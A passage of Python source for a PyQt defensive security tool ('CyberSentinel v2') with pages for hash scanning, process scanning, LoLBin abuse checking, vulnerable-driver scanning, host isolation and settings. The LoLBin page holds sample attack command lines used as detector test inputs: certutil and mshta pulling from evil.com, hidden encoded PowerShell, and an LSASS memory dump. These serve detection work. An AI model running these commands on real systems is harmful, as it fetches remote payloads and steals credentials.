        scan_hash_btn.setFixedWidth(80)
        scan_hash_btn.clicked.connect(self._run_hash_scan)
        single_row.addWidget(scan_hash_btn)
        grp_layout.addLayout(single_row)

        batch_row = QHBoxLayout()
        self._ioc_path = QLineEdit()
        self._ioc_path.setPlaceholderText("Or load a .txt file with one hash per line…")
        browse_ioc_btn = QPushButton("📂  Load .txt")
        browse_ioc_btn.setFixedWidth(100)
        browse_ioc_btn.clicked.connect(self._browse_ioc)
        scan_batch_btn = QPushButton("▶  Batch Scan")
        scan_batch_btn.setObjectName("primary")
        scan_batch_btn.setFixedWidth(110)
        scan_batch_btn.clicked.connect(self._run_batch_scan)
        batch_row.addWidget(self._ioc_path)
        batch_row.addWidget(browse_ioc_btn)
        batch_row.addWidget(scan_batch_btn)
        grp_layout.addLayout(batch_row)
        inner_layout.addWidget(grp)

        self._hash_console = ConsoleWidget()
        self._hash_console.append_line("● Enter a hash or load a .txt batch file.", THEME["muted"])
        inner_layout.addWidget(self._hash_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _browse_ioc(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select IoC List", filter="Text Files (*.txt)")
        if path:
            self._ioc_path.setText(path)

    def _run_hash_scan(self):
        h = self._hash_input.text().strip()
        if not h:
            return
        if len(h) not in (32, 40, 64):
            QMessageBox.warning(self, "Invalid Hash", "Hash must be 32 (MD5), 40 (SHA-1), or 64 (SHA-256) characters.")
            return
        self._hash_console.clear_console()
        self.logic.headless_mode = True
        worker = HashWorker(self.logic, [h])
        worker.line_out.connect(self._hash_console.append_line)
        worker.finished.connect(lambda ok: self._refresh_dashboard())
        self._workers.append(worker)
        worker.start()

    def _run_batch_scan(self):
        path = self._ioc_path.text().strip().strip("\"'")
        if not path or not os.path.isfile(path):
            QMessageBox.warning(self, "No File", "Please select a valid .txt IoC file.")
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                hashes = [l.strip() for l in f if l.strip() and len(l.strip()) in (32, 40, 64)]
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))
            return
        if not hashes:
            QMessageBox.warning(self, "No Hashes", "No valid hashes found in the file.")
            return
        self._hash_console.clear_console()
        self._hash_console.append_line(f"[*] Loaded {len(hashes)} hashes from {os.path.basename(path)}", THEME["blue"])
        self.logic.headless_mode = True
        worker = HashWorker(self.logic, hashes)
        worker.line_out.connect(self._hash_console.append_line)
        worker.finished.connect(lambda ok: self._refresh_dashboard())
        self._workers.append(worker)
        worker.start()

    # ── PAGE: LIVE EDR ────────────────────────────────────────────────────────

    def _build_live_edr_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "⚡", "Live EDR — Active Memory Analysis",
            "Click Enumerate to list running processes, then select a row and click Scan"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        note = QLabel("⚠️  Administrator privileges may be required to read process memory.")
        note.setStyleSheet(f"color: {THEME['yellow']}; font-size: 11px;")
        inner_layout.addWidget(note)

        # Button row
        btn_row = QHBoxLayout()
        enum_btn = QPushButton("📋  Enumerate Processes")
        enum_btn.setFixedWidth(190)
        enum_btn.clicked.connect(self._enumerate_processes)
        btn_row.addWidget(enum_btn)

        self._edr_scan_btn = QPushButton("⚡  Scan Selected Process")
        self._edr_scan_btn.setObjectName("primary")
        self._edr_scan_btn.setFixedWidth(190)
        self._edr_scan_btn.setEnabled(False)
        self._edr_scan_btn.clicked.connect(self._scan_selected_process)
        btn_row.addWidget(self._edr_scan_btn)

        self._edr_filter = QLineEdit()
        self._edr_filter.setPlaceholderText("Filter by name or path…")
        self._edr_filter.textChanged.connect(self._filter_edr_table)
        btn_row.addWidget(self._edr_filter)
        inner_layout.addLayout(btn_row)

        # Process table — click a row to select the process
        self._edr_table = make_table(["PID", "Process Name", "Executable Path"])
        self._edr_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self._edr_table.itemSelectionChanged.connect(self._edr_selection_changed)
        self._edr_table.doubleClicked.connect(self._scan_selected_process)
        inner_layout.addWidget(self._edr_table, 1)

        # Console below table
        self._edr_console = ConsoleWidget()
        self._edr_console.setMaximumHeight(160)
        self._edr_console.append_line(
            "● Click Enumerate Processes, then select a row and click Scan Selected Process.",
            THEME["muted"]
        )
        inner_layout.addWidget(self._edr_console)

        self._edr_procs = []   # store full proc list for filtering
        layout.addWidget(inner, 1)
        return page

    def _enumerate_processes(self):
        import psutil
        self._edr_table.setRowCount(0)
        self._edr_procs = []
        self._edr_scan_btn.setEnabled(False)
        self._edr_console.clear_console()
        self._edr_console.append_line("[*] Enumerating processes…", THEME["blue"])

        for proc in psutil.process_iter(["pid", "name", "exe"]):
            try:
                exe = proc.info["exe"]
                if exe and "C:\\Windows" not in exe:
                    self._edr_procs.append({
                        "pid":  proc.info["pid"],
                        "name": proc.info["name"],
                        "path": exe,
                    })
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                continue

        self._populate_edr_table(self._edr_procs)
        self._edr_console.append_line(
            f"[+] Found {len(self._edr_procs)} non-system processes. "
            "Select a row and click Scan, or double-click a row.",
            THEME["green"]
        )

    def _populate_edr_table(self, procs):
        t = self._edr_table
        t.setRowCount(0)
        for p in procs:
            row = t.rowCount()
            t.insertRow(row)
            t.setItem(row, 0, table_item(str(p["pid"]), THEME["blue"]))
            t.setItem(row, 1, table_item(p["name"]))
            t.setItem(row, 2, table_item(p["path"], THEME["muted"]))
        # Store proc data in row for retrieval
        t.setProperty("procs", procs)

    def _filter_edr_table(self, text):
        if not self._edr_procs:
            return
        text = text.lower()
        filtered = [
            p for p in self._edr_procs
            if text in p["name"].lower() or text in p["path"].lower()
        ] if text else self._edr_procs
        self._populate_edr_table(filtered)

    def _edr_selection_changed(self):
        self._edr_scan_btn.setEnabled(
            len(self._edr_table.selectedItems()) > 0
        )

    def _scan_selected_process(self):
        rows = self._edr_table.selectedItems()
        if not rows:
            return
        row = self._edr_table.currentRow()
        pid_item = self._edr_table.item(row, 0)
        path_item = self._edr_table.item(row, 2)
        if not pid_item or not path_item:
            return
        pid  = pid_item.text()
        path = path_item.text()
        name = self._edr_table.item(row, 1).text() if self._edr_table.item(row, 1) else ""

        if not path or not os.path.isfile(path):
            QMessageBox.warning(self, "Path Not Found",
                f"Could not access the executable for PID {pid}.\nThe process may have terminated or you may need administrator rights.")
            return

        self._edr_console.clear_console()
        self._edr_console.append_line(
            f"[*] Scanning PID {pid} — {name}", THEME["blue"]
        )
        self._edr_console.append_line(f"[*] Path: {path}", THEME["muted"])
        self._edr_scan_btn.setEnabled(False)

        def _do():
            self.logic.headless_mode = True
            self.logic.scan_file(path)

        worker = GenericWorker(_do)
        worker.line_out.connect(self._edr_console.append_line)
        worker.finished.connect(self._edr_scan_done)
        self._workers.append(worker)
        worker.start()

    def _edr_scan_done(self, _):
        self._edr_scan_btn.setEnabled(True)
        self._edr_console.append_line("[+] Scan complete.", THEME["green"])
        self._refresh_dashboard()

    # ── PAGE: LOLBAS ─────────────────────────────────────────────────────────

    def _build_lolbas_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🪝", "LoLBin Abuse Checker",
            "Detect Living-off-the-Land binary abuse via command-line pattern matching"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        form_grp = QGroupBox("Process to Analyze")
        form = QFormLayout(form_grp)
        form.setSpacing(10)

        self._lolbas_name = QLineEdit()
        self._lolbas_name.setPlaceholderText("e.g. certutil.exe, mshta.exe, powershell.exe")
        self._lolbas_cmd = QLineEdit()
        self._lolbas_cmd.setPlaceholderText("e.g. certutil.exe -urlcache -split -f http://evil.com/payload.exe")
        self._lolbas_cmd.returnPressed.connect(self._run_lolbas)

        form.addRow(QLabel("Process Name:"), self._lolbas_name)
        form.addRow(QLabel("Full Command Line:"), self._lolbas_cmd)
        inner_layout.addWidget(form_grp)

        btn_row = QHBoxLayout()
        check_btn = QPushButton("🔎  Check for Abuse")
        check_btn.setObjectName("primary")
        check_btn.setFixedWidth(160)
        check_btn.clicked.connect(self._run_lolbas)
        btn_row.addWidget(check_btn)

        # Quick examples
        examples = [
            ("certutil download", "certutil.exe", "certutil.exe -urlcache -split -f http://evil.com/p.exe C:\\tmp\\p.exe"),
            ("PowerShell -enc",   "powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgA"),
            ("ProcDump LSASS",    "procdump.exe",   "procdump.exe -ma lsass.exe C:\\tmp\\lsass.dmp"),
            ("mshta remote",      "mshta.exe",      "mshta.exe https://evil.com/script.hta"),
        ]
        for label, name, cmd in examples:
            eb = QPushButton(f"▸ {label}")
            eb.setFixedWidth(130)
            eb.clicked.connect(lambda _, n=name, c=cmd: (
                self._lolbas_name.setText(n),
                self._lolbas_cmd.setText(c),
            ))
            btn_row.addWidget(eb)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        self._lolbas_console = ConsoleWidget()
        self._lolbas_console.append_line("● Enter a process name + command line and click Check.", THEME["muted"])
        inner_layout.addWidget(self._lolbas_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _run_lolbas(self):
        name = self._lolbas_name.text().strip()
        cmd  = self._lolbas_cmd.text().strip()
        if not name:
            return
        self._lolbas_console.clear_console()
        self._lolbas_console.append_line(f"[*] Checking: {name}", THEME["blue"])
        hit = self.lolbas.check_process(name, cmd)
        if hit:
            alert = self.lolbas.format_alert(hit)
            for line in alert.splitlines():
                self._lolbas_console.append_line(line)
        else:
            self._lolbas_console.append_line(
                f"[+] No known LoLBin abuse pattern matched for '{name}'.", THEME["green"]
            )

    # ── PAGE: BYOVD ───────────────────────────────────────────────────────────

    def _build_byovd_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "💀", "BYOVD Vulnerable Driver Scanner",
            "Scan System32\\drivers against the LOLDrivers vulnerable kernel driver database"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        note = QLabel("Scans all .sys files in C:\\Windows\\System32\\drivers against the LOLDrivers database.")
        note.setStyleSheet(f"color: {THEME['muted']}; font-size: 11px;")
        inner_layout.addWidget(note)

        btn_row = QHBoxLayout()
        scan_btn = QPushButton("💀  Scan Loaded Drivers")
        scan_btn.setObjectName("primary")
        scan_btn.setFixedWidth(180)
        scan_btn.clicked.connect(self._run_byovd)
        btn_row.addWidget(scan_btn)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        self._byovd_progress = QProgressBar()
        self._byovd_progress.setRange(0, 0)
        self._byovd_progress.setVisible(False)
        self._byovd_progress.setFixedHeight(4)
        inner_layout.addWidget(self._byovd_progress)

        grp = QGroupBox("Driver Scan Results")
        grp_layout = QVBoxLayout(grp)
        self._byovd_table = make_table(["Driver", "CVE", "SHA-256", "Risk Level", "Details"])
        grp_layout.addWidget(self._byovd_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _run_byovd(self):
        self._byovd_table.setRowCount(0)
        self._byovd_progress.setVisible(True)

        def _do():
            return self.byovd.scan_loaded_drivers()

        worker = GenericWorker(_do)
        worker.line_out.connect(lambda txt: None)
        worker.finished.connect(self._byovd_done)
        self._workers.append(worker)
        worker.start()

    def _byovd_done(self, findings):
        self._byovd_progress.setVisible(False)
        t = self._byovd_table
        t.setRowCount(0)
        if not findings:
            row = t.rowCount(); t.insertRow(row)
            t.setItem(row, 0, table_item("✅  No vulnerable drivers found", THEME["green"]))
            for i in range(1, 5):
                t.setItem(row, i, table_item(""))
        else:
            for f in findings:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(f.get("driver_name", "—")))
                t.setItem(row, 1, table_item(f.get("cve", "N/A"), THEME["red"]))
                t.setItem(row, 2, table_item(f.get("sha256") or "", THEME["muted"]))
                t.setItem(row, 3, table_item(f.get("risk_level", "HIGH"), THEME["red"]))
                t.setItem(row, 4, table_item((f.get("description") or "")[:60], THEME["muted"]))

    # ── PAGE: ATTACK CHAINS ───────────────────────────────────────────────────

    def _build_chains_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🔗", "Attack Chain Correlation",
            "Multi-event attack sequence detection — reads from shared event timeline"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        btn_row = QHBoxLayout()
        run_btn = QPushButton("🔗  Run Correlation Sweep")
        run_btn.setObjectName("primary")
        run_btn.setFixedWidth(200)
        run_btn.clicked.connect(self._refresh_chains)
        btn_row.addWidget(run_btn)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        grp = QGroupBox("Detected Attack Chains")
        grp_layout = QVBoxLayout(grp)
        self._chains_table = make_table(["Timestamp", "Chain", "MITRE", "Severity", "Description"])
        grp_layout.addWidget(self._chains_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _refresh_chains(self):
        if hasattr(self, 'correlator'):
            try:
                self.correlator.run_correlation()
            except Exception:
                pass
        rows = _db_query(
            "SELECT chain_name, mitre, severity, description, timestamp FROM chain_alerts ORDER BY timestamp DESC LIMIT 50"
        )
        t = self._chains_table
        t.setRowCount(0)
        if not rows:
            row = t.rowCount(); t.insertRow(row)
            t.setItem(row, 0, table_item("No attack chains detected yet.", THEME["muted"]))
            for i in range(1, 5):
                t.setItem(row, i, table_item(""))
        else:
            for r in rows:
                row = t.rowCount(); t.insertRow(row)
                sev = r.get("severity", "MEDIUM")
                t.setItem(row, 0, table_item(r.get("timestamp", "")))
                t.setItem(row, 1, table_item(r.get("chain_name", "—"), THEME["red"]))
                t.setItem(row, 2, table_item(r.get("mitre", "—"), THEME["blue"]))
                t.setItem(row, 3, table_item(sev, THEME["red"] if sev == "CRITICAL" else THEME["yellow"]))
                t.setItem(row, 4, table_item((r.get("description") or "")[:80], THEME["muted"]))

    # ── PAGE: BASELINE ────────────────────────────────────────────────────────

    def _build_baseline_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "📐", "Environment Baseline Manager",
            "Learn normal host behavior — flag deviations as anomalies"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(16)

        ctrl_grp = QGroupBox("Learn Mode Control")
        ctrl_layout = QHBoxLayout(ctrl_grp)

        dur_label = QLabel("Learn duration (hours):")
        dur_label.setStyleSheet(f"color: {THEME['muted']}; border: none;")
        self._baseline_hours = QSpinBox()
        self._baseline_hours.setRange(1, 168)
        self._baseline_hours.setValue(24)
        self._baseline_hours.setFixedWidth(80)

        start_btn = QPushButton("▶  Start Learning")
        start_btn.setObjectName("success")
        start_btn.setFixedWidth(140)
        start_btn.clicked.connect(self._start_baseline)

        stop_btn = QPushButton("■  Stop & Save")
        stop_btn.setObjectName("danger")
        stop_btn.setFixedWidth(120)
        stop_btn.clicked.connect(self._stop_baseline)

        stats_btn = QPushButton("📊  Show Stats")
        stats_btn.setFixedWidth(110)
        stats_btn.clicked.connect(self._show_baseline_stats)

        ctrl_layout.addWidget(dur_label)
        ctrl_layout.addWidget(self._baseline_hours)
        ctrl_layout.addWidget(start_btn)
        ctrl_layout.addWidget(stop_btn)
        ctrl_layout.addWidget(stats_btn)
        ctrl_layout.addStretch()
        inner_layout.addWidget(ctrl_grp)

        self._baseline_console = ConsoleWidget()
        self._baseline_console.append_line("● Use controls above to manage baseline learning.", THEME["muted"])
        inner_layout.addWidget(self._baseline_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _start_baseline(self):
        hours = self._baseline_hours.value()
        self._baseline_console.clear_console()
        self._baseline_console.append_line(f"[*] Starting baseline learning for {hours} hour(s)…", THEME["blue"])

        def _do():
            self.baseline.start_learning(hours)
        worker = GenericWorker(_do)
        worker.line_out.connect(self._baseline_console.append_line)
        worker.finished.connect(lambda _: self._baseline_console.append_line("[+] Learn mode active.", THEME["green"]))
        self._workers.append(worker)
        worker.start()

    def _stop_baseline(self):
        self._baseline_console.append_line("[*] Stopping baseline and saving profiles…", THEME["yellow"])
        def _do():
            self.baseline.stop_learning()
        worker = GenericWorker(_do)
        worker.line_out.connect(self._baseline_console.append_line)
        worker.finished.connect(lambda _: self._baseline_console.append_line("[+] Baseline saved.", THEME["green"]))
        self._workers.append(worker)
        worker.start()

    def _show_baseline_stats(self):
        def _do():
            self.baseline.display_baseline_stats()
        worker = GenericWorker(_do)
        worker.line_out.connect(self._baseline_console.append_line)
        worker.finished.connect(lambda _: None)
        self._workers.append(worker)
        worker.start()

    # ── PAGE: FILELESS ────────────────────────────────────────────────────────

    def _build_fileless_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "👻", "Fileless / AMSI Alerts",
            "PowerShell ScriptBlock obfuscation detection via Windows Event Log 4104"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("↻  Refresh Alerts")
        refresh_btn.setObjectName("primary")
        refresh_btn.setFixedWidth(150)
        refresh_btn.clicked.connect(self._refresh_fileless)
        btn_row.addWidget(refresh_btn)
        btn_row.addStretch()

        req_note = QLabel("Requires: pywin32 + PowerShell ScriptBlock Logging enabled")
        req_note.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
        btn_row.addWidget(req_note)
        inner_layout.addLayout(btn_row)

        grp = QGroupBox("Fileless / AMSI Alert History")
        grp_layout = QVBoxLayout(grp)
        self._fileless_table = make_table(["Timestamp", "Source", "PID", "Findings"])
        grp_layout.addWidget(self._fileless_table)
        inner_layout.addWidget(grp, 1)

        layout.addWidget(inner, 1)
        return page

    def _refresh_fileless(self):
        rows = _db_query(
            "SELECT source, findings, pid, timestamp FROM fileless_alerts ORDER BY timestamp DESC LIMIT 50"
        )
        t = self._fileless_table
        t.setRowCount(0)
        if not rows:
            row = t.rowCount(); t.insertRow(row)
            t.setItem(row, 0, table_item("No fileless alerts detected yet.", THEME["muted"]))
            for i in range(1, 4):
                t.setItem(row, i, table_item(""))
        else:
            for r in rows:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(r.get("timestamp", "")))
                t.setItem(row, 1, table_item(r.get("source", "—")))
                t.setItem(row, 2, table_item(r.get("pid", "—")))
                t.setItem(row, 3, table_item((r.get("findings") or "")[:100], THEME["yellow"]))

    # ── PAGE: NETWORK ─────────────────────────────────────────────────────────

    def _build_network_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "🌐", "Network Containment",
            "Emergency host isolation — adds Windows Firewall block rules"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(16)

        warn = QLabel("⚠️  WARNING: Isolating the network will cut all internet connectivity until restored.")
        warn.setStyleSheet(f"""
            color: {THEME['red']};
            font-size: 12px;
            background: {THEME['red_bg']};
            border: 1px solid {THEME['red']};
            border-radius: 5px;
            padding: 10px 14px;
        """)
        inner_layout.addWidget(warn)

        btn_grp = QGroupBox("Containment Controls")
        btn_layout = QHBoxLayout(btn_grp)
        btn_layout.setSpacing(16)

        isolate_btn = QPushButton("🔒  ISOLATE HOST NETWORK")
        isolate_btn.setObjectName("danger")
        isolate_btn.setMinimumHeight(48)
        isolate_btn.setMinimumWidth(220)
        isolate_btn.clicked.connect(self._isolate_network)

        restore_btn = QPushButton("🔓  RESTORE NETWORK")
        restore_btn.setObjectName("success")
        restore_btn.setMinimumHeight(48)
        restore_btn.setMinimumWidth(180)
        restore_btn.clicked.connect(self._restore_network)

        btn_layout.addWidget(isolate_btn)
        btn_layout.addWidget(restore_btn)
        btn_layout.addStretch()
        inner_layout.addWidget(btn_grp)

        self._net_console = ConsoleWidget()
        self._net_console.append_line("● Network containment ready.", THEME["muted"])
        inner_layout.addWidget(self._net_console, 1)

        layout.addWidget(inner, 1)
        return page

    def _isolate_network(self):
        reply = QMessageBox.warning(
            self, "Confirm Isolation",
            "This will block ALL outbound and inbound traffic immediately.\n\nProceed?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            self._net_console.clear_console()
            worker = GenericWorker(self.isolate_net)
            worker.line_out.connect(self._net_console.append_line)
            worker.finished.connect(lambda _: self._net_console.append_line(
                "[!] Host isolated. Restore via Restore Network button.", THEME["red"]
            ))
            self._workers.append(worker)
            worker.start()

    def _restore_network(self):
        self._net_console.clear_console()
        worker = GenericWorker(self.restore_net)
        worker.line_out.connect(self._net_console.append_line)
        worker.finished.connect(lambda _: self._net_console.append_line(
            "[+] Network access restored.", THEME["green"]
        ))
        self._workers.append(worker)
        worker.start()

    # ── PAGE: INTEL ───────────────────────────────────────────────────────────

    def _build_intel_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "📡", "Threat Intel Feed Manager",
            "Download and refresh LOLBAS, LOLDrivers, Feodo, and JA3 blocklists"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        grp = QGroupBox("Feed Status")
        grp_layout = QVBoxLayout(grp)
        self._intel_table = make_table(["Feed", "Cached", "Last Updated", "Size (KB)"])
        self._intel_table.setMaximumHeight(180)
        grp_layout.addWidget(self._intel_table)
        inner_layout.addWidget(grp)

        btn_row = QHBoxLayout()
        check_btn = QPushButton("↻  Check Status")
        check_btn.setFixedWidth(130)
        check_btn.clicked.connect(self._check_intel_status)
        update_btn = QPushButton("⬇  Update All Feeds")
        update_btn.setObjectName("primary")
        update_btn.setFixedWidth(160)
        update_btn.clicked.connect(self._run_intel_update)
        btn_row.addWidget(check_btn)
        btn_row.addWidget(update_btn)
        btn_row.addStretch()
        inner_layout.addLayout(btn_row)

        self._intel_progress = QProgressBar()
        self._intel_progress.setRange(0, 0)
        self._intel_progress.setVisible(False)
        self._intel_progress.setFixedHeight(4)
        inner_layout.addWidget(self._intel_progress)

        self._intel_console = ConsoleWidget()
        self._intel_console.append_line("● Click Check Status or Update All Feeds.", THEME["muted"])
        inner_layout.addWidget(self._intel_console, 1)

        layout.addWidget(inner, 1)
        self._check_intel_status()
        return page

    def _check_intel_status(self):
        try:
            status = self.feed_status()
            t = self._intel_table
            t.setRowCount(0)
            for name, info in status.items():
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(name))
                cached = "✓" if info.get("cached") else "✗"
                t.setItem(row, 1, table_item(cached, THEME["green"] if info.get("cached") else THEME["red"]))
                t.setItem(row, 2, table_item(info.get("last_update", "Never")))
                t.setItem(row, 3, table_item(str(info.get("size_kb", 0))))
        except Exception as e:
            self._intel_console.append_line(f"[-] Could not read feed status: {e}", THEME["red"])

    def _run_intel_update(self):
        self._intel_console.clear_console()
        self._intel_console.append_line("[*] Updating all threat intelligence feeds…", THEME["blue"])
        self._intel_progress.setVisible(True)

        worker = GenericWorker(self.update_all, force=True)
        worker.line_out.connect(self._intel_console.append_line)
        worker.finished.connect(self._intel_update_done)
        self._workers.append(worker)
        worker.start()

    def _intel_update_done(self, _):
        self._intel_progress.setVisible(False)
        self._intel_console.append_line("[+] Intel update complete.", THEME["green"])
        self._check_intel_status()

    # ── PAGE: SETTINGS ────────────────────────────────────────────────────────

    def _build_settings_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "⚙️", "Configure Cloud Integrations",
            "API keys are encrypted with Fernet AES-128 and stored in config.json"
        ))

        inner = QWidget()
        inner_layout = QVBoxLayout(inner)
        inner_layout.setContentsMargins(24, 20, 24, 20)
        inner_layout.setSpacing(12)

        from modules import utils as _utils

        # API keys
        api_grp = QGroupBox("Cloud API Keys")
        api_form = QFormLayout(api_grp)
        api_form.setSpacing(10)
        self._api_fields = {}
        for key in ("virustotal", "alienvault", "metadefender", "malwarebazaar"):
            le = QLineEdit()
            le.setEchoMode(QLineEdit.EchoMode.Password)
            current = self.logic.api_keys.get(key, "")
            le.setPlaceholderText("Not configured" if not current else "••••••••••••••••")
            le.setText(current)
            self._api_fields[key] = le
            row_layout = QHBoxLayout()
            row_layout.addWidget(le)
            toggle = QPushButton("👁")
            toggle.setFixedWidth(32)
            toggle.setCheckable(True)
            toggle.toggled.connect(lambda checked, f=le: f.setEchoMode(
                QLineEdit.EchoMode.Normal if checked else QLineEdit.EchoMode.Password
            ))
            row_layout.addWidget(toggle)
            api_form.addRow(QLabel(key.capitalize() + ":"), row_layout)
        inner_layout.addWidget(api_grp)

        # Webhook
        wh_grp = QGroupBox("SOC Webhook")
        wh_layout = QHBoxLayout(wh_grp)
        self._webhook_field = QLineEdit()
        self._webhook_field.setPlaceholderText("https://discord.com/api/webhooks/… or Slack/Teams URL")
        self._webhook_field.setText(self.logic.webhook_url or "")
        test_wh_btn = QPushButton("🔔  Test")
        test_wh_btn.setFixedWidth(80)
        test_wh_btn.clicked.connect(self._test_webhook)
        wh_layout.addWidget(self._webhook_field)
        wh_layout.addWidget(test_wh_btn)
        inner_layout.addWidget(wh_grp)

        # Save
        save_btn = QPushButton("💾  Save Configuration")
        save_btn.setObjectName("primary")
        save_btn.setFixedWidth(180)
        save_btn.clicked.connect(self._save_settings)
        inner_layout.addWidget(save_btn)

        self._settings_status = QLabel("")
        self._settings_status.setStyleSheet(f"font-size: 11px; color: {THEME['green']};")
        inner_layout.addWidget(self._settings_status)
        inner_layout.addStretch()

        layout.addWidget(inner, 1)
        return page

    def _save_settings(self):
        from modules import utils as _utils
        for key, le in self._api_fields.items():
            val = le.text().strip()
            if val:
                self.logic.api_keys[key] = val
            else:
                self.logic.api_keys.pop(key, None)
        self.logic.webhook_url = self._webhook_field.text().strip()
        _utils.save_config(self.logic.api_keys, self.logic.webhook_url)
        self._settings_status.setText("[+] Configuration saved and encrypted.")

    def _test_webhook(self):
        from modules import utils as _utils
        url = self._webhook_field.text().strip()
        if not url:
            QMessageBox.warning(self, "No URL", "Please enter a webhook URL first.")
            return
        ok = _utils.send_webhook_alert(url, "🔔 CyberSentinel Webhook Test", {
            "Status": "This is a test alert from CyberSentinel GUI",
            "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        if ok:
            QMessageBox.information(self, "Success", "✅ Webhook test sent successfully!")
        else:
            QMessageBox.warning(self, "Failed", "❌ Webhook test failed — check the URL and your internet connection.")

    # ── STATUS BAR ────────────────────────────────────────────────────────────

    def _set_status(self, text: str, color: str = None):
        self._status_bar.setText(text)
        c = color or THEME["green"]
        self._status_bar.setStyleSheet(f"""
            color: {c}; font-size: 10px;
            padding: 8px 14px;
            border-top: 1px solid {THEME['border']};
            background: transparent;
        """)


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main():
    app = QApplication(sys.argv)
    app.setApplicationName("CyberSentinel v2")

    # Dark palette
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window,          QColor("#0d1117"))
    palette.setColor(QPalette.ColorRole.WindowText,      QColor("#c9d1d9"))
    palette.setColor(QPalette.ColorRole.Base,            QColor("#161b22"))
    palette.setColor(QPalette.ColorRole.AlternateBase,   QColor("#0d1117"))
    palette.setColor(QPalette.ColorRole.Text,            QColor("#c9d1d9"))
    palette.setColor(QPalette.ColorRole.Button,          QColor("#161b22"))
    palette.setColor(QPalette.ColorRole.ButtonText,      QColor("#c9d1d9"))
    palette.setColor(QPalette.ColorRole.Highlight,       QColor("#58a6ff"))
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor("#0d1117"))
    app.setPalette(palette)

    window = CyberSentinelGUI()
    window.show()
    window._show_page("dashboard")
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
